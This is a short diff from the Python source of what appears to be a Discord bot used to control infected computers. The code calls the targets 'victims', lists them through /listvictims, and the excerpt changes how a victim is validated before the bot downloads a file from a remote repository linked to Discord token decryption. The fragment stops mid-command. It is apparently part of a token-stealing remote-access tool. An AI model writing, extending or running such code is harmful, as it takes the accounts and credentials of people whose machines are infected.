@@ -33,7 +33,7 @@ class CheckedTokens(commands.Cog):
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             await ctx.response.defer()
             try:
                 tkr = bytes(requests.get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
